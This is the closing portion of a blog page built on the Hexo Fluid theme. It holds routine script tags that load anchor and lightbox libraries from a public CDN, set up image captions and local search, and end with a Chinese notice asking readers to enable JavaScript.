  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script src="/js/local-search.js"></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script src="/js/boot.js"></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
